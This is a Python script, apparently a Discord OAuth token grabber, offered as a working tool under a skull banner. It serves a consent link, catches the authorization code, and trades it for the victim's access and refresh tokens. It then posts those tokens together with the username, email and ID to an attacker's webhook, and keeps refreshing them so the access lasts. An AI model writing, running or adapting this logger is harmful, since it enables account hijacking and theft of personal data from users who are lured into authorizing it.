import asyncio
import aiohttp
import json
import time
import threading
import sys
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode
import webbrowser
import secrets

RED     = "\033[91m"
DRED    = "\033[31m"
RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"

ASCII_ART = f"""{DRED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣶⣶⣶⣾⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣤⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠈⠁⠉⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡟
⢸⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⡇
⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠀
⠀⢹⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⠇⠀
⠀⠀⢻⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣷⣶⣦⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⠟⡿⣿⣿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⡏⠀⠀
⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⡇⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀
⠀⠀⠀⠀⢀⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⡇⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⣼⣧⡀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠻⢿⣿⣿⣿⣿⣿⣧⠀⢀⣼⣿⣿⣷⡄⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣧⣀⣿⣿⣿⣿⣧⣰⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣿⠟⠋⠉⠛⠷⠶⠒⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠈⠻⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⠛⢻⣿⣿⡏⠀ ⣽⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣇⠀⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣿⢰⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣿⢸⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⣿⣿⣿⣿⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⡿⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⠀⣿⣿⣿⣿⠀⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⣿⣿⣿⡿⠀⣿⣿⣿⡇⢸⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⣿⣿⣿⡇⠀⣿⣿⣿⠇⢸⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⠀⢻⣿⣿⡇⠀⣿⣿⣿⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠋⠀⠸⣿⣿⠇⠀⢿⣿⠏⠀⠸⠿⠿⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{RESET}"""

def type_print(text, delay=0.03, color=RED):
    for ch in text:
        sys.stdout.write(color + ch + RESET)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def clear():
    os.system("cls" if os.name == "nt" else "clear")

state_store    = {}
captured_tokens = {}
CONFIG         = {}

class OAuthCallbackHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path != "/callback":
            self.send_response(404); self.end_headers(); return

        params = parse_qs(parsed.query)
        code   = params.get("code",  [None])[0]

        if not code:
            self._respond(400, "Missing code"); return

        self._respond(200,
            "<html><body style='background:#0a0a0a;color:#ff2222;"
            "font-family:monospace;text-align:center;padding-top:80px'>"
            "<h1>&#x2714; Authorization Successful</h1>"
            "<p>You may close this tab.</p></body></html>")

        threading.Thread(
            target=lambda: asyncio.run(exchange_code(code)),
            daemon=True
        ).start()

    def _respond(self, status, body):
        self.send_response(status)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body.encode())


async def exchange_code(code: str):
    redirect_uri = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com") + "/callback"
    data = {
        "client_id":     CONFIG["client_id"],
        "client_secret": CONFIG["client_secret"],
        "grant_type":    "authorization_code",
        "code":          code,
        "redirect_uri":  redirect_uri,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://discord.com/api/oauth2/token",
            data=urlencode(data), headers=headers
        ) as resp:
            if resp.status != 200:
                print(f"{RED}[!] Token exchange failed: {resp.status}{RESET}")
                return
            token_data = await resp.json()

        user_info = await fetch_user(session, token_data["access_token"])

    uid = user_info.get("id", "unknown")
    captured_tokens[uid] = {
        "access_token":  token_data["access_token"],
        "refresh_token": token_data.get("refresh_token"),
        "expires_at":    time.time() + token_data.get("expires_in", 604800),
        "scope":         token_data.get("scope", ""),
    }

    print(f"{RED}[+] Token captured — {user_info.get('username','?')} ({uid}){RESET}")
    await send_to_webhook(token_data, user_info, event="initial_capture")


async def fetch_user(session, access_token: str) -> dict:
    headers = {"Authorization": f"Bearer {access_token}"}
    async with session.get(
        "https://discord.com/api/v10/users/@me", headers=headers
    ) as resp:
        return await resp.json() if resp.status == 200 else {}


async def refresh_token_for(user_id: str, refresh_tok: str):
    data = {
        "client_id":     CONFIG["client_id"],
        "client_secret": CONFIG["client_secret"],
        "grant_type":    "refresh_token",
        "refresh_token": refresh_tok,
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    async with aiohttp.ClientSession() as session:
        async with session.post(
            "https://discord.com/api/oauth2/token",
            data=urlencode(data), headers=headers
        ) as resp:
            if resp.status != 200:
                print(f"{RED}[!] Refresh failed for {user_id}: {resp.status}{RESET}")
                return
            token_data = await resp.json()

        user_info = await fetch_user(session, token_data["access_token"])

    captured_tokens[user_id] = {
        "access_token":  token_data["access_token"],
        "refresh_token": token_data.get("refresh_token", refresh_tok),
        "expires_at":    time.time() + token_data.get("expires_in", 604800),
        "scope":         token_data.get("scope", ""),
    }
    print(f"{RED}[~] Token refreshed — {user_id}{RESET}")
    await send_to_webhook(token_data, user_info, event="token_refresh")


async def send_to_webhook(token_data: dict, user_info: dict, event: str):
    username = user_info.get("username", "unknown")
    user_id  = user_info.get("id",       "unknown")
    email    = user_info.get("email",    "N/A")
    discrim  = user_info.get("discriminator", "0")

    color = 0xFF0000 if event == "initial_capture" else 0x8B0000
    r_token = token_data.get('refresh_token', 'N/A')
    a_token = token_data.get('access_token', 'N/A')

    embed = {
        "title": f"🔴  {'Token Captured' if event == 'initial_capture' else 'Token Refreshed'}",
        "color": color,
        "fields": [
            {"name": "👤 User",          "value": f"`{username}#{discrim}` (`{user_id}`)", "inline": True},
            {"name": "📧 Email",         "value": email,                                   "inline": True},
            {"name": "⚡ Event",         "value": event.replace("_", " ").title(),          "inline": True},
            {"name": "🔑 Access Token",  "value": "```" + a_token + "```",                   "inline": False},
            {"name": "🔄 Refresh Token", "value": "```" + r_token + "```",                   "inline": False},
            {"name": "⏳ Expires In",    "value": f"{token_data.get('expires_in','?')}s",  "inline": True},
            {"name": "🌐 Scope",         "value": token_data.get("scope", "N/A"),          "inline": True},
            {"name": "🕐 Time",          "value": f"<t:{int(time.time())}:F>",             "inline": False},
        ],
        "footer": {"text": "By So7"},
        "thumbnail": {
            "url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_info.get('avatar','')}.png"
            if user_info.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
        },
    }

    payload = {
        "embeds":   [embed],
        "username": "So7 Logger",
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(CONFIG["webhook"], json=payload) as resp:
            status = "✓" if resp.status in (200, 204) else "✗"
            print(f"{RED}[{status}] Webhook → {event} for {user_id}  ({resp.status}){RESET}")


async def refresh_loop():
    while True:
        await asyncio.sleep(300)
        now = time.time()
        for uid, data in list(captured_tokens.items()):
            if data["expires_at"] - now < 600 and data.get("refresh_token"):
                print(f"{RED}[~] Near expiry — refreshing {uid}{RESET}")
                await refresh_token_for(uid, data["refresh_token"])


def build_auth_url() -> str:
    base_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
    redirect_uri = f"{base_url}/callback"
    params = {
        "client_id":     CONFIG["client_id"],
        "redirect_uri":  redirect_uri,
        "response_type": "code",
        "scope":         "identify email guilds",
        "state":         secrets.token_urlsafe(16),
        "prompt":        "consent",
    }
    return "https://discord.com/oauth2/authorize?" + urlencode(params)


def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), OAuthCallbackHandler)
    server.serve_forever()


async def main():
    clear()
    print(ASCII_ART)

    type_print("  hi This tool was created by @o4ah.", delay=0.04)
    type_print("  If you need assistance, head over to discord.gg/k-y", delay=0.04)
    print()
    time.sleep(0.5)
    print()
    time.sleep(0.8)

    # سحب المتغيرات من إعدادات البيئة تلقائياً بدون إدخال يدوي
    CONFIG["bot_token"]     = os.environ.get("bot_token", "")
    CONFIG["client_id"]     = os.environ.get("client_id", "")
    CONFIG["client_secret"] = os.environ.get("client_secret", "")
    CONFIG["webhook"]       = os.environ.get("webhook", "")

    if not CONFIG["client_id"] or not CONFIG["webhook"]:
        print(f"{RED}[!] Error: Missing required environment variables.{RESET}")
        return

    print(f"{RED}[+] Configuration loaded successfully from environment variables.{RESET}\n")

    threading.Thread(target=run_server, daemon=True).start()

    auth_url = build_auth_url()
    print(f"{BOLD}{RED}[+] Authorization Link:{RESET}")
    print(f"{DRED}    {auth_url}{RESET}")
    print()
    print(f"{DIM}{RED}[*] Server is running & waiting for authorization...{RESET}")
    print()

    await refresh_loop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped.{RESET}")
